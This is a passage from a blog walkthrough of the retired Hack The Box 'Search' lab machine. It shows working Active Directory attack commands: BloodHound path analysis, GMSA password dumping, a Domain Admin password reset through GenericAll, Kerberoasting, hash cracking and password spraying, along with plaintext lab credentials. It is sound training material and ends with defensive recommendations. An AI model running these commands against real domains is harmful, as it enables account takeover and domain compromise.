+BloodHound is a tool that maps Active Directory as a <strong>graph database</strong>. It collects:</p>
+<ul>
+<li>Users, groups, computers</li>
+<li>Group memberships</li>
+<li>Permissions and ACLs</li>
+<li>Trust relationships</li>
+</ul>
+<p><strong>Why use it?</strong></p>
+<blockquote>
+<p>In Active Directory, the path to Domain Admin is rarely direct. BloodHound finds the <strong>shortest path</strong> from any owned account to Domain Admin by analyzing permission chains.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"I'm not looking for one vulnerability. I'm looking for the PATH — the chain of small permissions that leads from Sierra.Frye to Domain Admin. BloodHound turns an impossible maze into a clear roadmap."</strong></p>
+</blockquote>
+<h3 id="11-2-the-path-to-domain-admin">11.2 The Path to Domain Admin</h3>
+<p><strong>BloodHound reveals:</strong></p>
+<pre><code>Sierra.Frye → MemberOf → ITSEC@search.htb
+ITSEC → ReadGMSAPassword → BIR-ADFS-GMSA@
+BIR-ADFS-GMSA$ → GenericAll → Tristan.Davies
+Tristan.Davies → MemberOf → Domain Admins
+</code></pre>
+<p><strong>What each relationship means:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Relationship</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>MemberOf</code></td>
+<td>User is a member of the group</td>
+</tr>
+<tr>
+<td><code>ReadGMSAPassword</code></td>
+<td>Group can read the GMSA's managed password</td>
+</tr>
+<tr>
+<td><code>GenericAll</code></td>
+<td>Full control over the target object (read, write, delete, reset password)</td>
+</tr>
+<tr>
+<td><code>Domain Admins</code></td>
+<td>Members have administrative access to all domain resources</td>
+</tr>
+</tbody></table>
+<hr />
+<h2 id="12-gmsa-abuse-the-hidden-service-account">12. GMSA Abuse: The Hidden Service Account</h2>
+<h3 id="12-1-what-is-a-gmsa">12.1 What is a GMSA?</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>BIR-ADFS-GMSA$:::[redacted retired-lab hash or flag]
+BIR-ADFS-GMSA$:aes256-cts-hmac-sha1-96:[redacted encoded lab material]
+BIR-ADFS-GMSA$:aes128-cts-hmac-sha1-96:[redacted retired-lab hash or flag]
+</code></pre>
+<p><strong>What is a GMSA?</strong></p>
+<blockquote>
+<p><strong>Group Managed Service Account (GMSA)</strong> is a special AD account type where:</p>
+</blockquote>
+<ul>
+<li>The password is REDACTED generated and rotated by Active Directory</li>
+<li>The password is <strong>REDACTED bytes</strong> of random data — impossible to crack</li>
+<li>Only specific security principals (groups/users) can retrieve the password</li>
+</ul>
+<p><strong>Why GMSAs are dangerous:</strong></p>
+<blockquote>
+<p>The password itself is uncrackable, but <strong>who can read it</strong> is what matters. If a regular user (or group they belong to) has <code>ReadGMSAPassword</code> permission, they can retrieve the plaintext-equivalent hash and act as the GMSA.</p>
+</blockquote>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"The GMSA password is REDACTED fortress — uncrackable, unguessable. But the gatekeeper is just a permission. ITSEC can read the password, Sierra is in ITSEC, so Sierra can read the password. The fortress is irrelevant when the gate is open."</strong></p>
+</blockquote>
+<hr />
+<h2 id="13-domain-admin-via-genericall">13. Domain Admin via GenericAll</h2>
+<h3 id="13-1-what-is-genericall">13.1 What is GenericAll?</h3>
+<p><code>GenericAll</code> is the <strong>highest level of access</strong> in Active Directory ACLs. It means:</p>
+<ul>
+<li>Read all attributes</li>
+<li>Write all attributes</li>
+<li>Delete the object</li>
+<li><strong>Reset the password</strong></li>
+<li>Modify group membership</li>
+<li>Etc.</li>
+</ul>
+<h3 id="13-2-resetting-tristan-davies-password">13.2 Resetting Tristan.Davies' Password</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
+Password: null retired-lab hash or flag]
+
+rpcclient $&gt; setuserinfo2 tristan.davies 23 'qwerty1234!'
+</code></pre>
+<p><strong>What <code>setuserinfo2</code> does:</strong></p>
+<ul>
+<li><code>setuserinfo2</code> is an MS-RPC function to modify user attributes</li>
+<li><code>23</code> = <code>USER_PASSWORD</code> field (NT password hash / cleartext)</li>
+<li><code>'qwerty1234!'</code> = The new password</li>
+</ul>
+<p><strong>Why does this work?</strong></p>
+<blockquote>
+<p>Because <code>BIR-ADFS-GMSA$</code> has <code>GenericAll</code> on <code>Tristan.Davies</code>, the GMSA can reset Tristan's password without knowing the old one.</p>
+</blockquote>
+<p><strong>Alternative methods (from writeups):</strong></p>
+<pre><code class="language-powershell" data-language="powershell"># Via PowerShell (if you have a shell)
+$cred = New-Object System.Management.Automation.PSCredential("BIR-ADFS-GMSA$", $gmsa_password)
+Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { net user Tristan.Davies qwerty1234! /domain }
+</code></pre>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"I didn't hack Tristan.Davies. I hacked the PERMISSION that controls Tristan.Davies. This is the essence of Active Directory attacks — you don't attack the admin, you attack the thing that has power over the admin."</strong></p>
+</blockquote>
+<hr />
+<h2 id="14-capturing-the-root-flag">14. Capturing the Root Flag</h2>
+<h3 id="14-1-verifying-domain-admin-access">14.1 Verifying Domain Admin Access</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">crackmapexec smb 10.129.229.57 -u Tristan.Davies -p REDACTED
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>[+] search.htb\Tristan.Davies:qwerty1234! (Pwn3d!)
+</code></pre>
+<p><strong>What <code>(Pwn3d!)</code> means:</strong>
+This is <code>crackmapexec</code>'s way of confirming the user has <strong>administrative access</strong> to the machine. It automatically tests if it can get a privileged session.</p>
+<h3 id="14-2-grabbing-root-txt">14.2 Grabbing root.txt</h3>
+<p><strong>Command:</strong></p>
+<pre><code class="language-bash" data-language="bash">smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
+smb: \&gt; cd Users\Administrator\Desktop
+smb: \Users\Administrator\Desktop\&gt; get root.txt
+</code></pre>
+<p><strong>Root Flag:</strong> <code>213fb[redacted]9e29dd3b1</code></p>
+<p><strong>Hacker Mindset:</strong></p>
+<blockquote>
+<p><strong>"The flag is just a file. The real victory is understanding the chain: image → password → user → kerberoast → spray → excel → certificates → bloodhound → GMSA → GenericAll → Domain Admin. Every step was a small crack. Together, they shattered the foundation."</strong></p>
+</blockquote>
+<hr />
+<h2 id="15-key-lessons-and-takeaways">15. Key Lessons &amp; Takeaways</h2>
+<h3 id="attack-techniques-used">Attack Techniques Used</h3>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Purpose</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Kerbrute userenum</td>
+<td>Find valid usernames</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Kerberoasting</td>
+<td>Extract service account hashes</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>Password Spraying</td>
+<td>Find password reuse</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Excel XML Deobfuscation</td>
+<td>Bypass sheet protection</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>BloodHound Analysis</td>
+<td>Find privilege escalation paths</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>GMSA Password Dumping</td>
+<td>Escalate via service accounts</td>
+<td>Hard</td>
+</tr>
+<tr>
+<td>GenericAll Abuse</td>
+<td>Reset Domain Admin password</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<h3 id="why-this-machine-is-hard">Why This Machine is "Hard"</h3>
+<p>This machine is rated <strong>Hard</strong> not because any single step is impossible, but because:</p>
+<ol>
+<li>It requires <strong>chaining 10+ steps</strong> together</li>
+<li>Each step depends on the previous one</li>
+<li>It tests <strong>multiple domains of knowledge</strong>: web, SMB, Kerberos, AD, certificates, PowerShell</li>
+<li>The path to Domain Admin is <strong>indirect</strong> — you must follow the permission chain</li>
+</ol>
+<h3 id="the-most-important-lesson">The Most Important Lesson</h3>
+<blockquote>
+<p><strong>"Active Directory security is not about finding the ONE vulnerability. It's about understanding the GRAPH of trust, permissions, and group memberships. A chain of three 'low' vulnerabilities beats one 'critical' vulnerability when the chain leads to Domain Admin."</strong></p>
+</blockquote>
+<h3 id="defensive-recommendations">Defensive Recommendations</h3>
+<ol>
+<li><strong>Never put credentials in images or public documents</strong></li>
+<li><strong>Enforce unique passwords</strong> for service accounts (no reuse)</li>
+<li><strong>Monitor for Kerberoasting</strong> — alerts on TGS requests from non-service accounts</li>
+<li><strong>Review BloodHound regularly</strong> — know your shortest paths to Domain Admin</li>
+<li><strong>Audit GMSA permissions</strong> — limit who can read managed passwords</li>
+<li><strong>Remove GenericAll</strong> where possible — use more granular permissions</li>
+<li><strong>Rotate leaked credentials immediately</strong> when phishing simulations end</li>
+<li><strong>Encrypt and protect backup certificates</strong> — don't store them in user folders</li>
+</ol>
+<hr />
+<h2 id="full-command-reference">Full Command Reference</h2>
+<pre><code class="language-bash" data-language="bash"># Step 1: Hosts + Nmap
+echo "10.129.229.57 search.htb" | sudo tee -a /etc/hosts
+sudo nmap -sC -sV -p- --min-rate=10000 10.129.229.57 -oN nmap_all.txt
+
+# Step 2: Web recon
+curl -s http://search.htb/images/slide_2.jpg -o slide_2.jpg
+xdg-open slide_2.jpg  # Password: null for Hope.Sharp
+
+# Step 3: Kerbrute
+cat &gt; users.txt &lt;&lt; 'EOF'
+Dax.Santiago
+Keely.Lyons
+Sierra.Frye
+Kyla.Stewart
+Kaiara.Spencer
+Dave.Simpson
+Ben.Thompson
+Chris.Stewart
+Hope.Sharp
+EOF
+kerbrute userenum users.txt -d search.htb --dc 10.129.229.57
+
+# Step 4: SMB with Hope.Sharp
+crackmapexec smb 10.129.229.57 -u Hope.Sharp -p REDACTED --shares
+smbclient //search.htb/RedirectedFolders$ -U 'Hope.Sharp' -W search.htb
+
+# Step 5: Kerberoast
+sudo ntpdate 10.129.229.57
+GetUserSPNs.py -request -dc-ip 10.129.229.57 search.htb/Hope.Sharp:'IsolationIsKey?'
+
+# Step 6: Crack hash
+hashcat -m 13100 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
+# Result: @3ONEmillionbaby
+
+# Step 7: Spray password
+crackmapexec smb 10.129.229.57 -u all_users.txt -p REDACTED --continue-on-success
+# Result: edgar.jacobs
+
+# Step 8: Get Excel + unlock
+smbclient //search.htb/RedirectedFolders$ -U 'edgar.jacobs' -W search.htb
+cp Phishing_Attempt.xlsx Phishing_Attempt.zip
+unzip -q Phishing_Attempt.zip -d phishing_unlocked/
+sed -i 's|&lt;sheetProtection[^&gt;]*/&gt;||g' phishing_unlocked/xl/worksheets/sheet2.xml
+cd phishing_unlocked &amp;&amp; zip -rq ../Phishing_Unlocked.xlsx * &amp;&amp; cd ..
+
+# Step 9: Spray new passwords
+crackmapexec smb 10.129.229.57 -u Sierra.Frye -p REDACTED --shares
+
+# Step 10: Get user flag + certificates
+smbclient //search.htb/RedirectedFolders$ -U 'Sierra.Frye' -W search.htb
+# get user.txt from Desktop
+# get staff.pfx and search-RESEARCH-CA.p12 from Downloads\Backups
+
+# Step 11: BloodHound
+bloodhound-python -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18' -ns 10.129.229.57 -d search.htb -c All
+
+# Step 12: GMSA dump
+python3 gMSADumper.py -d search.htb -u 'Sierra.Frye' -p '$$49=wide=STRAIGHT=jordan=28$$18'
+
+# Step 13: Reset Domain Admin password
+rpcclient -U 'BIR-ADFS-GMSA$' -W search.htb search.htb --pw-nt-hash
+# Password: null retired-lab hash or flag]
+rpcclient $&gt; setuserinfo2 tristan.davies 23 'qwerty1234!'
+
+# Step 14: Root flag
+smbclient //search.htb/C$ -U 'Tristan.Davies' -W search.htb
+# get root.txt from Users\Administrator\Desktop
+</code></pre>
+<hr />
+<p><em>Walkthrough created for educational purposes. Only use these techniques on systems you have explicit permission to test.</em></p>
+a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$f"}}]
+b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-sizzle-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Sizzle Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-seal-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Seal Walkthrough"}]]}]}]]}]
+c:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+10:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/#article","headline":"Hack The Box: Search Walkthrough","description":"An archived walkthrough of the retired Hack The Box Search machine, preserved from Abdullah Kareem's OSEP Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/","datePublished":"2026-06-11T16:07:39.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3360,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSEP-Prep/blob/286dbe321c28c8a189c50c015eee54a2eb6e7d2a/HTB-Search.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-search-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Search Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-search-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$10"}}]
+e:["$","$L11",null,{"children":["$","$12",null,{"name":"Next.MetadataOutlet","children":"$@13"}]}]
+13:null
